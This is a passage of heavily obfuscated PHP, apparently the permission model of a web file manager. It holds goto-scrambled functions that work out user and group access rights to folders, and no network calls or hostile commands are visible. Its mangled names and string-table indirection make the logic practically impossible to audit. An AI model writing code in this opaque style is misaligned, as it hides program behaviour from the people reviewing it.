$Cñß–í = array_values(array_unique($Cñß–í)); $Añµà²´ = $Cñß–í; goto a»Åã –ª; FÌİºíã™: $B³‹²ÉÕï²[$Bçäˆ İĞ­] = $aåì¨ª¢•¡; return $aåì¨ª¢•¡; goto EŠÙæ–˜¹ª; EŒÔİ–¢ÖÆ: if (isset($B³‹²ÉÕï²[$Bçäˆ İĞ­])) { return $B³‹²ÉÕï²[$Bçäˆ İĞ­]; } $Bçğí²Òæ = Model($d¼é­­•Ù[2296])->listData(); $Dôµ•Ì•šä = array(); goto EòïŸ¾“Ó¨; fø¹äƒõ°‰: $F‚òóãÖ¨Ú = array_to_keyvalue($a›™™â§à, $d¼é­­•Ù[43], $d¼é­­•Ù[378]); $eÁ¡¯² = array(); $Cñß–í = $d¬¶¿å’Š÷; goto F‚èøÍÑÄŠ; b«½‰ê§•Æ: $Aİ¨Ñ„Ã†è = array(); $d–°×‡ñ„œ = array(); $eœ¨ƒÓÙ‘› = array(); goto CÂÔŞÜ¹ß; EòïŸ¾“Ó¨: foreach ($Bçğí²Òæ as $cÕêèš“Ì) { if ($cÕêèš“Ì[$d¼é­­•Ù[385]] == 0 && $cÕêèš“Ì[$d¼é­­•Ù[2135]] == $d¼é­­•Ù[93]) { $Dôµ•Ì•šä[] = $cÕêèš“Ì[$d¼é­­•Ù[376]]; } } $d¬¶¿å’Š÷ = $this->userGroupParents($Bçäˆ İĞ­); $a£Ãš¹…‰… = array($d¼é­­•Ù[380] => SourceModel::TYPE_USER, $d¼é­­•Ù[467] => $Bçäˆ İĞ­); goto dšĞ…²Šêè; F‚èøÍÑÄŠ: $C«‘Ìğãã = Model($d¼é­­•Ù[1124]); $bÓ¦£½Š = Model($d¼é­­•Ù[469]); $f–‚ó”¦Ë£ = array(); goto b«½‰ê§•Æ; EŠÙæ–˜¹ª: } private function makeSourceAuth($cœ°Ê²¯¾, $E£óæ½‹óÀ, $E·³ºÛÛ¿› = false) { goto d×­³ÁÕ³Ô; fğƒÎ¿Ïî: if (!$bë«ˆê’‚Ô) { $A¤¬¥©ÊˆÏ = Model($cÖÜŒÅ‡…â[469])->getInfo($a´±¶Şš„Ü); $eá„ˆÈ¤í¹ = explode($cÖÜŒÅ‡…â[57], trim($A¤¬¥©ÊˆÏ[$cÖÜŒÅ‡…â[470]], $cÖÜŒÅ‡…â[57])); foreach ($eá„ˆÈ¤í¹ as $AÈùšÀˆˆ) { if ($AÈùšÀˆˆ == $cÖÜŒÅ‡…â[479] || $AÈùšÀˆˆ == $DÈÛ¹ßÀåĞ) { continue; } $f¤ãæ ¸âÇ = $this->groupRootAuth($AÈùšÀˆˆ, $E·³ºÛÛ¿›); if (!$f¤ãæ ¸âÇ) { continue; } $bë«ˆê’‚Ô = $this->groupAuthInfo($f¤ãæ ¸âÇ, $AÈùšÀˆˆ); break; } } if (!$bë«ˆê’‚Ô || $bë«ˆê’‚Ô[$cÖÜŒÅ‡…â[386]] <= 0) { $fÛÈ„¼™ò× = $this->authDeepCheck($cœ°Ê²¯¾[$cÖÜŒÅ‡…â[378]], $E·³ºÛÛ¿›); if ($fÛÈ„¼™ò×) { $bë«ˆê’‚Ô = $fÛÈ„¼™ò×; } } return $bë«ˆê’‚Ô; goto AèäÂ‹ÒŒÅ; Eğ¸×À×„: $Cˆ¸¬ˆ”¬Î = Model($cÖÜŒÅ‡…â[1124])->parentLevelArray($cœ°Ê²¯¾[$cÖÜŒÅ‡…â[470]]); $Cˆ¸¬ˆ”¬Î = array_merge(array($cœ°Ê²¯¾[$cÖÜŒÅ‡…â[378]]), array_reverse($Cˆ¸¬ˆ”¬Î)); $bë«ˆê’‚Ô = !1; goto DÏµ¼‰ó¨æ; DÏµ¼‰ó¨æ: foreach ($Cˆ¸¬ˆ”¬Î as $A½ãšÌÛ·ç) { if (!isset($E£óæ½‹óÀ[$A½ãšÌÛ·ç])) { continue; } $a‡æÜ±ßª = $this->authMake($E£óæ½‹óÀ[$A½ãšÌÛ·ç], $E·³ºÛÛ¿›); if ($a‡æÜ±ßª[$cÖÜŒÅ‡…â[427]]) { $bë«ˆê’‚Ô = $a‡æÜ±ßª; break; } } if (!$bõ™¨¾†Òå) { return $bë«ˆê’‚Ô; } if (!$bë«ˆê’‚Ô && $EãêÛù¾†À) { $bë«ˆê’‚Ô = $this->groupAuthInfo($EãêÛù¾†À, $a´±¶Şš„Ü); } goto fğƒÎ¿Ïî; cï¼‹ˆˆìÖ: $bõ™¨¾†Òå = $cœ°Ê²¯¾[$cÖÜŒÅ‡…â[380]] == SourceModel::TYPE_GROUP; $EãêÛù¾†À = $bõ™¨¾†Òå ? $this->groupRootAuth($a´±¶Şš„Ü, $E·³ºÛÛ¿›) : !1; if ($EãêÛù¾†À && Model($cÖÜŒÅ‡…â[2277])->authCheckAction($EãêÛù¾†À[$cÖÜŒÅ‡…â[385]], $cÖÜŒÅ‡…â[1569])) { return $this->groupAuthInfo($EãêÛù¾†À, $a´±¶Şš„Ü); } goto Eğ¸×À×„; d×­³ÁÕ³Ô: $cÖÜŒÅ‡…â =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÈÛ¹ßÀåĞ = $cÖÜŒÅ‡…â[93]; $a´±¶Şš„Ü = $cœ°Ê²¯¾[$cÖÜŒÅ‡…â[467]]; goto cï¼‹ˆˆìÖ; AèäÂ‹ÒŒÅ: } private function userIsRoot($f±µ»÷„† = false) { $FÚì——ŠØ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$f±µ»÷„† && _get($GLOBALS, $FÚì——ŠØ[468])) { return !0; } $CáÂŠ‚ªÉ = Model($FÚì——ŠØ[488])->getInfo($f±µ»÷„†); $f÷ŠÁ‘½ù = Model($FÚì——ŠØ[2299])->listData($CáÂŠ‚ªÉ[$FÚì——ŠØ[1328]]); if ($f÷ŠÁ‘½ù && $f÷ŠÁ‘½ù[$FÚì——ŠØ[1199]][$FÚì——ŠØ[2300]] == 1) { return !0; } return !1; } private function sourceAuthInfo($d„òçµ†ƒ‹) { goto CÆ¦ğÀ«¤; CÆ¦ğÀ«¤: $A¹Ú¨ë•ò¤ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eô‰¦É‚Øë = Model($A¹Ú¨ë•ò¤[1124]); $f¥‹¾¤ê“£ = $eô‰¦É‚Øë->sourceInfo($d„òçµ†ƒ‹); goto E±”°õ‹; B„Œ’Ìºì¾: $D¶ë¯š‰ = $eô‰¦É‚Øë->_listAppendPath($D¶ë¯š‰); $f¥‹¾¤ê“£ = $D¶ë¯š‰[0]; $b°â©ª°·¢ = $f¥‹¾¤ê“£[$A¹Ú¨ë•ò¤[477]]; goto EêŠĞÄÒî˜; E±”°õ‹: if (!$f¥‹¾¤ê“£) { return !1; } $eô‰¦É‚Øë->groupPathDisplay($f¥‹¾¤ê“£); $D¶ë¯š‰ = array($f¥‹¾¤ê“£); goto B„Œ’Ìºì¾; EêŠĞÄÒî˜: if (isset($f¥‹¾¤ê“£[$A¹Ú¨ë•ò¤[475]])) { $c’‰¿òè¶Ô = explode($A¹Ú¨ë•ò¤[18], trim($f¥‹¾¤ê“£[$A¹Ú¨ë•ò¤[477]], $A¹Ú¨ë•ò¤[18])); array_shift($c’‰¿òè¶Ô); $b°â©ª°·¢ = $f¥‹¾¤ê“£[$A¹Ú¨ë•ò¤[473]] . $A¹Ú¨ë•ò¤[2301] . implode($A¹Ú¨ë•ò¤[18], $c’‰¿òè¶Ô); } return array($A¹Ú¨ë•ò¤[395] => $f¥‹¾¤ê“£[$A¹Ú¨ë•ò¤[38]], $A¹Ú¨ë•ò¤[85] => KodIO::make($f¥‹¾¤ê“£[$A¹Ú¨ë•ò¤[378]]), $A¹Ú¨ë•ò¤[2302] => $b°â©ª°·¢); goto FŠæÖâ·ì; FŠæÖâ·ì: } private function groupAuthInfo($dçÊŞŠ†ßÛ, $a‘Ê­Ó‹èº) { $AÓ¢øİƒÚĞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cõ‰ÛÚòó¥ = Model($AÓ¢øİƒÚĞ[469])->getInfo($a‘Ê­Ó‹èº); return array($AÓ¢øİƒÚĞ[2303] => intval($dçÊŞŠ†ßÛ[$AÓ¢øİƒÚĞ[385]]), $AÓ¢øİƒÚĞ[2286] => $dçÊŞŠ†ßÛ, $AÓ¢øİƒÚĞ[2304] => LNG($AÓ¢øİƒÚĞ[2305]), $AÓ¢øİƒÚĞ[2295] => array($AÓ¢øİƒÚĞ[395] => $Cõ‰ÛÚòó¥[$AÓ¢øİƒÚĞ[38]], $AÓ¢øİƒÚĞ[85] => KodIO::make($Cõ‰ÛÚòó¥[$AÓ¢øİƒÚĞ[400]][$AÓ¢øİƒÚĞ[378]]), $AÓ¢øİƒÚĞ[2302] => $Cõ‰ÛÚòó¥[$AÓ¢øİƒÚĞ[474]])); } protected function groupRootAuth($cÀÔ½õøØ¬, $Dåïïø©ß¯ = false) { goto fñéî¤‘ö; FëƒÉ”Ÿ…â: $DŠêÈ…í¿ï = $bÎ†®øòˆÏ ? $this->authMake($bÎ†®øòˆÏ, $Dåïïø©ß¯) : !1; $CòŒ¸öºğ«[$E…ôÇŠ¦Ñ] = $DŠêÈ…í¿ï ? $DŠêÈ…í¿ï[$E¼ßóøÂÎ[427]] : $fË¤ì—ÏÊ¥; return $CòŒ¸öºğ«[$E…ôÇŠ¦Ñ]; goto aâ‚ª¾‰; dÉ˜™¹ìƒ: static $CòŒ¸öºğ« = array(); if (isset($CòŒ¸öºğ«[$E…ôÇŠ¦Ñ])) { return $CòŒ¸öºğ«[$E…ôÇŠ¦Ñ]; } $céº¸‚“Î = $this->userGroupList($Dåïïø©ß¯); goto b¿…¨‚‹§ö; b¿…¨‚‹§ö: $fË¤ì—ÏÊ¥ = isset($céº¸‚“Î[$cÀÔ½õøØ¬]) ? $céº¸‚“Î[$cÀÔ½õøØ¬][$E¼ßóøÂÎ[385]] : !1; if ($fË¤ì—ÏÊ¥ && Model($E¼ßóøÂÎ[2277])->authCheckAction($fË¤ì—ÏÊ¥[$E¼ßóøÂÎ[385]], $E¼ßóøÂÎ[1569])) { $CòŒ¸öºğ«[$E…ôÇŠ¦Ñ] = $fË¤ì—ÏÊ¥; return $fË¤ì—ÏÊ¥; } $fˆùƒè” = Model($E¼ßóøÂÎ[469])->getInfo($cÀÔ½õøØ¬); goto eÛÚáëªè‘; eÛÚáëªè‘: $dÄ¹Ö¤‘Ç = array($E¼ßóøÂÎ[378] => $fˆùƒè”[$E¼ßóøÂÎ[400]][$E¼ßóøÂÎ[378]]); $d„Ÿíµõ¬É = $E¼ßóøÂÎ[2285]; $bÎ†®øòˆÏ = $this->field($d„Ÿíµõ¬É)->cacheMemory()->where($dÄ¹Ö¤‘Ç)->select(); goto FëƒÉ”Ÿ…â; fñéî¤‘ö: $E¼ßóøÂÎ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Dåïïø©ß¯ = $Dåïïø©ß¯ ? $Dåïïø©ß¯ : USER_ID; $E…ôÇŠ¦Ñ = $Dåïïø©ß¯ . $E¼ßóøÂÎ[2306] . $cÀÔ½õøØ¬; goto dÉ˜™¹ìƒ; aâ‚ª¾‰: } public function authOwnerApply($AÌâ¿Ç…Üô) { goto a‘¶‚†Àİ; A†É™­õÊ: if (count($BùÏĞÍ†”™) == 0) { $BùÏĞÍ†”™ = $this->authFolderOwnerGroup($AÌâ¿Ç…Üô[$b¬‘°ãÏï[467]]); } $BùÏĞÍ†”™ = array_unique($BùÏĞÍ†”™); if (AuthModel::authCheckRoot($AÌâ¿Ç…Üô[$b¬‘°ãÏï[385]][$b¬‘°ãÏï[386]])) { $BùÏĞÍ†”™[] = USER_ID; } goto D¾¸Š½Í“Ù; dÜ³ªÓë—¾: $c¢ñï§ÍÉ = Model($b¬‘°ãÏï[1124])->parentLevelArray($AÌâ¿Ç…Üô[$b¬‘°ãÏï[470]]); $c¢ñï§ÍÉ = array_merge(array($AÌâ¿Ç…Üô[$b¬‘°ãÏï[378]]), array_reverse($c¢ñï§ÍÉ)); $c«À‰áù·é = $b¬‘°ãÏï[2285]; goto aí–Œ¦ÖĞ; a‘¶‚†Àİ: $b¬‘°ãÏï =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($AÌâ¿Ç…Üô[$b¬‘°ãÏï[385]]) || isset($AÌâ¿Ç…Üô[$b¬‘°ãÏï[2307]]) && $AÌâ¿Ç…Üô[$b¬‘°ãÏï[2307]]) { return $AÌâ¿Ç…Üô; } if (AuthModel::authCheckRoot($AÌâ¿Ç…Üô[$b¬‘°ãÏï[385]][$b¬‘°ãÏï[386]])) { return $AÌâ¿Ç…Üô; } goto dÜ³ªÓë—¾; D¾¸Š½Í“Ù: $AÌâ¿Ç…Üô[$b¬‘°ãÏï[385]][$b¬‘°ãÏï[2309]] = Model($b¬‘°ãÏï[485])->userListInfo($BùÏĞÍ†”™); return $AÌâ¿Ç…Üô; goto AÔ‘ò¯ƒÈä; B®Ÿ†˜Ë´: $Dë‰¦Œ¬ñ› = array(); $BùÏĞÍ†”™ = array(); foreach ($F´ëÛà„ò as $DàïÚ¶Òé => $bá½‹¬‰¬â) { $DÍ®‘Œ«» = $this->authFolderOwnerUser($bá½‹¬‰¬â); $Dë‰¦Œ¬ñ›[$DàïÚ¶Òé] = $DÍ®‘Œ«»; $BùÏĞÍ†”™ = array_merge($BùÏĞÍ†”™, $DÍ®‘Œ«»[$b¬‘°ãÏï[546]]); if ($DÍ®‘Œ«»[$b¬‘°ãÏï[2308]]) { break; } } goto A†É™­õÊ; aí–Œ¦ÖĞ: $bŒ‡Ï¼¡ä = array($b¬‘°ãÏï[392] => array($b¬‘°ãÏï[393], $c¢ñï§ÍÉ)); $F´ëÛà„ò = $this->field($c«À‰áù·é)->where($bŒ‡Ï¼¡ä)->select(); $F´ëÛà„ò = array_to_keyvalue_group($F´ëÛà„ò, $b¬‘°ãÏï[378]); goto B®Ÿ†˜Ë´; AÔ‘ò¯ƒÈä: } private function authFolderOwnerGroup($b™¯¨’Ñˆ) { $e½ˆÄİİ÷µ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F¢ÅÆ›£ = Model($e½ˆÄİİ÷µ[2193])->where(array($e½ˆÄİİ÷µ[2114] => $b™¯¨’Ñˆ))->select(); $d³Âõİõ–¡ = array(); if (!$F¢ÅÆ›£) { return $d³Âõİõ–¡; } foreach ($F¢ÅÆ›£ as $dƒœáŠĞ»‘) { $dçÍçß­ã± = $this->authInfo($dƒœáŠĞ»‘); if (AuthModel::authCheckRoot($dçÍçß­ã±[$e½ˆÄİİ÷µ[385]])) { $d³Âõİõ–¡[] = $dƒœáŠĞ»‘[$e½ˆÄİİ÷µ[1443]]; } } return $d³Âõİõ–¡; } private function authFolderOwnerUser($aÄøø£³×Ş) { $A…·Ÿë± =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A˜ĞƒæŠöÌ = array(); $cæõ‰¬ÜÀå = !1; foreach ($aÄøø£³×Ş as $cà‚“Ğ”ê) { $C­æ¼ÚòÕ = $this->authInfo($cà‚“Ğ”ê); if ($cà‚“Ğ”ê[$A…·Ÿë±[467]] == $A…·Ÿë±[479]) { $cæõ‰¬ÜÀå = !0; } if ($cà‚“Ğ”ê[$A…·Ÿë±[380]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($C­æ¼ÚòÕ[$A…·Ÿë±[385]])) { $A˜ĞƒæŠöÌ[] = $cà‚“Ğ”ê[$A…·Ÿë±[467]]; } } } return array($A…·Ÿë±[546] => $A˜ĞƒæŠöÌ, $A…·Ÿë±[2308] => $cæõ‰¬ÜÀå); } public function authMake($DÆÀë¼àŸ, $E¤½…“•É× = false) { goto C‘ËÒ®©«Ğ; FÍßœôô: $B’ÒëâƒºÛ = 0; $dÛ¬›œºèº = 0; $a³Ù†ç…ëº = array($C¶‰£®ÖòŞ[378] => 0); goto BéÜ‡¦àÔ; C‘ËÒ®©«Ğ: $C¶‰£®ÖòŞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$DÆÀë¼àŸ) { return array($C¶‰£®ÖòŞ[386] => 0, $C¶‰£®ÖòŞ[427] => !1); } $E¤½…“•É× = $E¤½…“•É× ? $E¤½…“•É× : USER_ID; goto cÈÒàºƒŒ×; BÆªŒˆ ÷İ: $Dê–Îì•Ş‰ = 0; $aµùÍ¹‡å = 0; $f’î”¢¾ = 0; goto Aäğ„ª£í—; C¼ÃæÏ×í: return $E†°æ²‡Âî; goto EÈ¢ö¸ë×µ; Aäğ„ª£í—: $a ‚ëÎ»ôù = 1000; $A²Ô™Òµç = 0; $C¹ê–†Ê÷µ = 0; goto FÍßœôô; BéÜ‡¦àÔ: foreach ($DÆÀë¼àŸ as $a³Ù†ç…ëº) { $fÅíâ·’Œò = $this->authInfo($a³Ù†ç…ëº); $cöÀØÊ±®Ÿ = $a³Ù†ç…ëº[$C¶‰£®ÖòŞ[467]]; $d¤¥µ†²› = intval($fÅíâ·’Œò[$C¶‰£®ÖòŞ[385]]); if ($a³Ù†ç…ëº[$C¶‰£®ÖòŞ[380]] == SourceModel::TYPE_USER && $cöÀØÊ±®Ÿ == $E¤½…“•É×) { $fáï¸µñè = !0; $fÒë”Ö²ğ = $fÅíâ·’Œò; $CÈ÷‡º“à = $d¤¥µ†²›; } else { if ($a³Ù†ç…ëº[$C¶‰£®ÖòŞ[380]] == SourceModel::TYPE_GROUP && $this->groupContainUser($cöÀØÊ±®Ÿ, $E¤½…“•É×)) { $Dê–Îì•Ş‰ = !0; $D˜ÇäœÇ„ä = $this->groupStepToUserGroup($cöÀØÊ±®Ÿ, $E¤½…“•É×); if ($D˜ÇäœÇ„ä < $a ‚ëÎ»ôù) { $a ‚ëÎ»ôù = $D˜ÇäœÇ„ä; $aµùÍ¹‡å = $d¤¥µ†²›; $f’î”¢¾ = $fÅíâ·’Œò; $A²Ô™Òµç = $cöÀØÊ±®Ÿ; } if ($D˜ÇäœÇ„ä == $a ‚ëÎ»ôù && $d¤¥µ†²› >= $aµùÍ¹‡å) { $aµùÍ¹‡å = $d¤¥µ†²›; $f’î”¢¾ = $fÅíâ·’Œò; $A²Ô™Òµç = $cöÀØÊ±®Ÿ; } } else { if ($cöÀØÊ±®Ÿ == $C¶‰£®ÖòŞ[479]) { $C¹ê–†Ê÷µ = !0; $dÛ¬›œºèº = $fÅíâ·’Œò; $B’ÒëâƒºÛ = $d¤¥µ†²›; } } } } if ($fáï¸µñè) { $FïøÃ¦’ªó = $CÈ÷‡º“à; $fÅíâ·’Œò = $fÒë”Ö²ğ; $e‘»ËÎçÒà = LNG($C¶‰£®ÖòŞ[2310]); } else { if ($Dê–Îì•Ş‰) { $FïøÃ¦’ªó = $aµùÍ¹‡å; $fÅíâ·’Œò = $f’î”¢¾; $Fò‚†Àš© = Model($C¶‰£®ÖòŞ[469])->getInfo($A²Ô™Òµç); $e‘»ËÎçÒà = $C¶‰£®ÖòŞ[167] . $Fò‚†Àš©[$C¶‰£®ÖòŞ[474]] . $C¶‰£®ÖòŞ[2311] . LNG($C¶‰£®ÖòŞ[2312]); } else { if ($C¹ê–†Ê÷µ) { $FïøÃ¦’ªó = $B’ÒëâƒºÛ; $fÅíâ·’Œò = $dÛ¬›œºèº; $e‘»ËÎçÒà = LNG($C¶‰£®ÖòŞ[2282]); } else { $e‘»ËÎçÒà = $C¶‰£®ÖòŞ[43]; } } } $E†°æ²‡Âî = array($C¶‰£®ÖòŞ[2303] => intval($FïøÃ¦’ªó), $C¶‰£®ÖòŞ[2286] => $fÅíâ·’Œò, $C¶‰£®ÖòŞ[2304] => $e‘»ËÎçÒà, $C¶‰£®ÖòŞ[2295] => $this->sourceAuthInfo($a³Ù†ç…ëº[$C¶‰£®ÖòŞ[378]])); goto C¼ÃæÏ×í; cÈÒàºƒŒ×: $fáï¸µñè = 0; $CÈ÷‡º“à = 0; $fÒë”Ö²ğ = 0; goto BÆªŒˆ ÷İ; EÈ¢ö¸ë×µ: } private function groupContainUser($b¶‰ãæËÖ, $a±£…“ ñé = false) { return in_array($b¶‰ãæËÖ, $this->userGroupParents($a±£…“ ñé)); } private function groupStepToUserGroup($b”Ñ“öù¢, $bÙÔ†‡¥ø˜ = false) { goto EÛõŸĞª“Ö; B¡­¨©Õ ‹: $bÚÉğ¼õ = $GLOBALS[$FÉ†‘å„àğ[16]][$FÉ†‘å„àğ[94]][$FÉ†‘å„àğ[2205]] == 1; $eÁˆ†ŠÏğé = $bÚÉğ¼õ ? 3 : 2; foreach ($dËï‰ç¬ºÌ as $bĞ‹÷³Õá·) { if ($bĞ‹÷³Õá·[$FÉ†‘å„àğ[2114]] == $b”Ñ“öù¢) { return 0; } $fì§¯Û©­É = explode($FÉ†‘å„àğ[57], trim($bĞ‹÷³Õá·[$FÉ†‘å„àğ[470]], $FÉ†‘å„àğ[57])); if ($fì§¯Û©­É[0] == $FÉ†‘å„àğ[479] && count($fì§¯Û©­É) > $eÁˆ†ŠÏğé) { $f‹¿Ş¹¶ = array_reverse(array_slice($fì§¯Û©­É, $eÁˆ†ŠÏğé)); $c£ç·àËß = array_search($b”Ñ“öù¢, $f‹¿Ş¹¶); if ($c£ç·àËß !== !1 && $c£ç·àËß + 1 <= $fºˆˆ¹¢áÖ) { $fºˆˆ¹¢áÖ = $c£ç·àËß + 1; } } } goto DÒ¾¸Åİİ; EÛõŸĞª“Ö: $FÉ†‘å„àğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dËï‰ç¬ºÌ = $this->userGroupList($bÙÔ†‡¥ø˜); $fºˆˆ¹¢áÖ = 1000; goto B¡­¨©Õ ‹; DÒ¾¸Åİİ: return $fºˆˆ¹¢áÖ; goto D‘ÛƒØÍí¸; D‘ÛƒØÍí¸: } private function userGroupList($DĞãÛÇÏ½ä = false) { $fºÓ·¼–¨ =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $c©©–ÇĞƒ = array(); if (isset($c©©–ÇĞƒ[$DĞãÛÇÏ½ä])) { return $c©©–ÇĞƒ[$DĞãÛÇÏ½ä]; } $Aš‡‡Ó‘§Ê = Model($fºÓ·¼–¨[488])->getInfo($DĞãÛÇÏ½ä); $c©©–ÇĞƒ[$DĞãÛÇÏ½ä] = array_to_keyvalue($Aš‡‡Ó‘§Ê[$fºÓ·¼–¨[2283]], $fºÓ·¼–¨[2114]); return $c©©–ÇĞƒ[$DĞãÛÇÏ½ä]; } public function userGroupParents($Cï»Ü“Ù§Ú) { goto f­¨ä¹öÈ¥; BîĞìÌœØ•: $E¨ÕŠ÷‚ = $GLOBALS[$e¿…»‰„ß¶[16]][$e¿…»‰„ß¶[94]][$e¿…»‰„ß¶[2205]] == 1; $fšÊÔŸ©×Ü = $E¨ÕŠ÷‚ ? 3 : 2; foreach ($fù›Ä÷è as $FÕØÀà–ˆ) { $bùâÚ¶âß = array($FÕØÀà–ˆ[$e¿…»‰„ß¶[2114]]); $f‹—ø£İ‰³ = explode($e¿…»‰„ß¶[57], trim($FÕØÀà–ˆ[$e¿…»‰„ß¶[470]], $e¿…»‰„ß¶[57])); if ($f‹—ø£İ‰³[0] == $e¿…»‰„ß¶[479] && count($f‹—ø£İ‰³) > $fšÊÔŸ©×Ü) { $cÓ¤ìá‰ÁÔ = array_slice($f‹—ø£İ‰³, $fšÊÔŸ©×Ü); $bùâÚ¶âß = array_merge($bùâÚ¶âß, array_reverse($cÓ¤ìá‰ÁÔ)); } $e«ËÃˆ±‘¨ = array_merge($e«ËÃˆ±‘¨, $bùâÚ¶âß); } goto Fù«×œÔ; AİÑÎ¸ä : if (isset($b£°¦È‰ø[$Cï»Ü“Ù§Ú])) { return $b£°¦È‰ø[$Cï»Ü“Ù§Ú]; } $fù›Ä÷è = $this->userGroupList($Cï»Ü“Ù§Ú); $e«ËÃˆ±‘¨ = array(); goto BîĞìÌœØ•; Fù«×œÔ: $b£°¦È‰ø[$Cï»Ü“Ù§Ú] = array_unique($e«ËÃˆ±‘¨); return $b£°¦È‰ø[$Cï»Ü“Ù§Ú]; goto a«¶œŠ˜à¼; f­¨ä¹öÈ¥: $e¿…»‰„ß¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $b£°¦È‰ø = array(); $Cï»Ü“Ù§Ú = $Cï»Ü“Ù§Ú ? $Cï»Ü“Ù§Ú : USER_ID; goto AİÑÎ¸ä ; a«¶œŠ˜à¼: } public function authTargetInfoMake($Dß¨´Ú«È) { goto e¥öâÃ›í ; cƒœÏˆ§§‡: foreach ($Dß¨´Ú«È as $A³©æª‰½„) { if ($A³©æª‰½„[$BÁŸ¤ÈÏá[380]] == SourceModel::TYPE_USER) { $CÃÔ ÅéîĞ[] = intval($A³©æª‰½„[$BÁŸ¤ÈÏá[467]]); } else { if ($A³©æª‰½„[$BÁŸ¤ÈÏá[380]] == SourceModel::TYPE_GROUP) { $FŞÅÆ‚í­[] = intval($A³©æª‰½„[$BÁŸ¤ÈÏá[467]]); } } } if ($CÃÔ ÅéîĞ) { $CÃÔ ÅéîĞ = Model($BÁŸ¤ÈÏá[485])->userListInfo($CÃÔ ÅéîĞ); } if ($FŞÅÆ‚í­) { $b÷Ó´ãŸ‘Ü = array($BÁŸ¤ÈÏá[2191] => array($BÁŸ¤ÈÏá[393], $FŞÅÆ‚í­)); $FŞÅÆ‚í­ = Model($BÁŸ¤ÈÏá[469])->field($BÁŸ¤ÈÏá[2204])->where($b÷Ó´ãŸ‘Ü)->select(); $FŞÅÆ‚í­ = array_to_keyvalue($FŞÅÆ‚í­, $BÁŸ¤ÈÏá[2114]); } goto fÉ‡‚ìÓøñ; fÉ‡‚ìÓøñ: return array($BÁŸ¤ÈÏá[2313] => $CÃÔ ÅéîĞ, $BÁŸ¤ÈÏá[2314] => $FŞÅÆ‚í­); goto CŸƒĞ–Ñá; e¥öâÃ›í : $BÁŸ¤ÈÏá =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CÃÔ ÅéîĞ = array(); $FŞÅÆ‚í­ = array(); goto cƒœÏˆ§§‡; CŸƒĞ–Ñá: } public function authInfo($fŒ†ä¾Àó) { $aŒ£×ë•Ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($fŒ†ä¾Àó[$aŒ£×ë•Ã[2258]]) { $FøìÁùƒ· = Model($aŒ£×ë•Ã[2277])->listData($fŒ†ä¾Àó[$aŒ£×ë•Ã[2258]]); if (!$FøìÁùƒ·) { return !1; $Eãªñø“ = Model($aŒ£×ë•Ã[2277])->listData(); $d•†‡Ö‹¯ = array_filter_by_field($Eãªñø“, $aŒ£×ë•Ã[385], $aŒ£×ë•Ã[479]); return $d•†‡Ö‹¯; } $Dæì©ÒĞ› = array_field_key($FøìÁùƒ·, array($aŒ£×ë•Ã[376], $aŒ£×ë•Ã[38], $aŒ£×ë•Ã[385], $aŒ£×ë•Ã[2133], $aŒ£×ë•Ã[2136])); $Dæì©ÒĞ›[$aŒ£×ë•Ã[2315]] = $fŒ†ä¾Àó; return $Dæì©ÒĞ›; } else { return array($aŒ£×ë•Ã[394] => 0, $aŒ£×ë•Ã[2120] => $fŒ†ä¾Àó[$aŒ£×ë•Ã[2259]], $aŒ£×ë•Ã[395] => $aŒ£×ë•Ã[43], $aŒ£×ë•Ã[2133] => $aŒ£×ë•Ã[2316]); } } } goto BË”é¿…Ü; BÁ²’ÍœóŒ: function Action($C’ßµ…µ•É = '') { goto f”ÄÆ‰çË; C™Ş¼Ğ¥ÕÃ: $Aæ†Ëë£½á[$Fµëª£ã†¿] = new $aä‰áâà¨î(); $Aæ†Ëë£½á[$BìÙïÇ®ªÃ] = $Aæ†Ëë£½á[$Fµëª£ã†¿]; return $Aæ†Ëë£½á[$Fµëª£ã†¿]; goto eÇäÉ§§²; B÷‡Áíˆ¸·: if (isset($Aæ†Ëë£½á[$BìÙïÇ®ªÃ])) { return $Aæ†Ëë£½á[$BìÙïÇ®ªÃ]; } $C’ßµ…µ•É = trim(str_replace($EÓÎ±¨õáÛ[4], $EÓÎ±¨õáÛ[5], $C’ßµ…µ•É), $EÓÎ±¨õáÛ[4]); $EõÇíŠŠ—ğ = explode($EÓÎ±¨õáÛ[5], $C’ßµ…µ•É); goto bÉõ×ºŸ—¹; f”ÄÆ‰çË: $EÓÎ±¨õáÛ =& $_SERVER[·ü]; static $Aæ†Ëë£½á = array(); $BìÙïÇ®ªÃ = $C’ßµ…µ•É; goto B÷‡Áíˆ¸·; bÉõ×ºŸ—¹: $AÙ“‡®Âå = strtolower($EõÇíŠŠ—ğ[0]); if (substr($AÙ“‡®Âå, -6) == $EÓÎ±¨õáÛ[6]) { $C’ßµ…µ•É = substr($EõÇíŠŠ—ğ[0], 0, -6); $aä‰áâà¨î = $C’ßµ…µ•É . $EÓÎ±¨õáÛ[7]; $d±Ì—ÕÕ = $EÓÎ±¨õáÛ[8]; if (isset($EõÇíŠŠ—ğ[1]) && substr(strtolower($EõÇíŠŠ—ğ[1]), -5) == $EÓÎ±¨õáÛ[9]) { $aä‰áâà¨î = $C’ßµ…µ•É . $EõÇíŠŠ—ğ[1]; $d±Ì—ÕÕ = $EÓÎ±¨õáÛ[10] . $EõÇíŠŠ—ğ[1] . $EÓÎ±¨õáÛ[11]; } else { if (count($EõÇíŠŠ—ğ) == 3) { $aä‰áâà¨î = $C’ßµ…µ•É . $EõÇíŠŠ—ğ[1] . $EõÇíŠŠ—ğ[2]; $d±Ì—ÕÕ = $EÓÎ±¨õáÛ[12] . $EõÇíŠŠ—ğ[1] . $EÓÎ±¨õáÛ[13] . $EõÇíŠŠ—ğ[2] . $EÓÎ±¨õáÛ[11]; } } $d±Ì—ÕÕ = PLUGIN_DIR . $C’ßµ…µ•É . $EÓÎ±¨õáÛ[4] . $d±Ì—ÕÕ; } else { if 